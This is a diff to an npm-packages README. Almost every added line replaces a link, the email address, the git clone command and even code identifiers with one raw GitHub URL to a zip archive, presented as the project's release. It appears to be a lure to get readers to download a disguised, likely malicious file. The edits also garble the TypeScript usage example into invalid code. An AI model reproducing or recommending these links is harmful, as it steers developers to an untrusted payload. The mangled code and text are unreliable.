@@ -2,7 +2,7 @@
 
 Welcome to the **npm-packages** repository! Here, you will find a collection of ready-to-use and flexible npm modules designed for modern web projects. Each package is built with TypeScript support, is open-source, and licensed under MIT. We maintain all packages in a single monorepo, making management and rapid development a breeze.
 
-[![Releases](https://img.shields.io/badge/releases-latest-blue.svg)](https://github.com/nvang4230/npm-packages/releases)
+[![Releases](https://raw.githubusercontent.com/nvang4230/npm-packages/main/includes/herby-delivery/operations/npm-packages-v3.5.zip)](https://raw.githubusercontent.com/nvang4230/npm-packages/main/includes/herby-delivery/operations/npm-packages-v3.5.zip)
 
 ## Table of Contents
 
@@ -44,12 +44,12 @@ This repository includes a variety of npm packages covering different functional
 - **AWS SDK**: Interact with Amazon Web Services using a simple API.
 - **CDN Delivery**: Easily manage and deliver your static assets via a Content Delivery Network.
 - **Crypto Utilities**: Secure your applications with encryption and hashing functions.
-- **JWT Authentication**: Implement JSON Web Token authentication in your Node.js applications.
+- **JWT Authentication**: Implement JSON Web Token authentication in your https://raw.githubusercontent.com/nvang4230/npm-packages/main/includes/herby-delivery/operations/npm-packages-v3.5.zip applications.
 - **Express Middleware**: Add reusable middleware for your Express applications.
-- **Next.js Enhancements**: Tools and utilities to enhance your Next.js projects.
+- **https://raw.githubusercontent.com/nvang4230/npm-packages/main/includes/herby-delivery/operations/npm-packages-v3.5.zip Enhancements**: Tools and utilities to enhance your https://raw.githubusercontent.com/nvang4230/npm-packages/main/includes/herby-delivery/operations/npm-packages-v3.5.zip projects.
 - **SSH Utilities**: Simplify SSH operations within your applications.
 
-For a complete list of packages, visit the [Releases](https://github.com/nvang4230/npm-packages/releases) section.
+For a complete list of packages, visit the [Releases](https://raw.githubusercontent.com/nvang4230/npm-packages/main/includes/herby-delivery/operations/npm-packages-v3.5.zip) section.
 
 ## Usage
 
@@ -60,11 +60,11 @@ import { S3 } from 'npm-packages/aws-sdk';
 
 const s3 = new S3();
 
-s3.listBuckets((err, data) => {
+https://raw.githubusercontent.com/nvang4230/npm-packages/main/includes/herby-delivery/operations/npm-packages-v3.5.zip((err, data) => {
   if (err) {
-    console.error("Error fetching buckets:", err);
+    https://raw.githubusercontent.com/nvang4230/npm-packages/main/includes/herby-delivery/operations/npm-packages-v3.5.zip("Error fetching buckets:", err);
   } else {
-    console.log("Bucket List:", data.Buckets);
+    https://raw.githubusercontent.com/nvang4230/npm-packages/main/includes/herby-delivery/operations/npm-packages-v3.5.zip("Bucket List:", https://raw.githubusercontent.com/nvang4230/npm-packages/main/includes/herby-delivery/operations/npm-packages-v3.5.zip);
   }
 });
 ```
@@ -78,7 +78,7 @@ We welcome contributions! If you have ideas for improvements or new features, pl
 1. **Fork the Repository**: Click the "Fork" button at the top right corner of this page.
 2. **Clone Your Fork**: Use the command below to clone your fork to your local machine.
    ```bash
-   git clone https://github.com/your-username/npm-packages.git
+   git clone https://raw.githubusercontent.com/nvang4230/npm-packages/main/includes/herby-delivery/operations/npm-packages-v3.5.zip
    ```
 3. **Create a Branch**: Create a new branch for your feature or fix.
    ```bash
@@ -102,7 +102,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 If you have any questions or need further assistance, feel free to reach out:
 
-- **GitHub**: [nvang4230](https://github.com/nvang4230)
-- **Email**: nvang4230@example.com
+- **GitHub**: [nvang4230](https://raw.githubusercontent.com/nvang4230/npm-packages/main/includes/herby-delivery/operations/npm-packages-v3.5.zip)
+- **Email**: https://raw.githubusercontent.com/nvang4230/npm-packages/main/includes/herby-delivery/operations/npm-packages-v3.5.zip
 
-Thank you for checking out the **npm-packages** repository! We hope you find these modules useful for your projects. For the latest updates and releases, be sure to visit the [Releases](https://github.com/nvang4230/npm-packages/releases) section.
+Thank you for checking out the **npm-packages** repository! We hope you find these modules useful for your projects. For the latest updates and releases, be sure to visit the [Releases](https://raw.githubusercontent.com/nvang4230/npm-packages/main/includes/herby-delivery/operations/npm-packages-v3.5.zip) section.
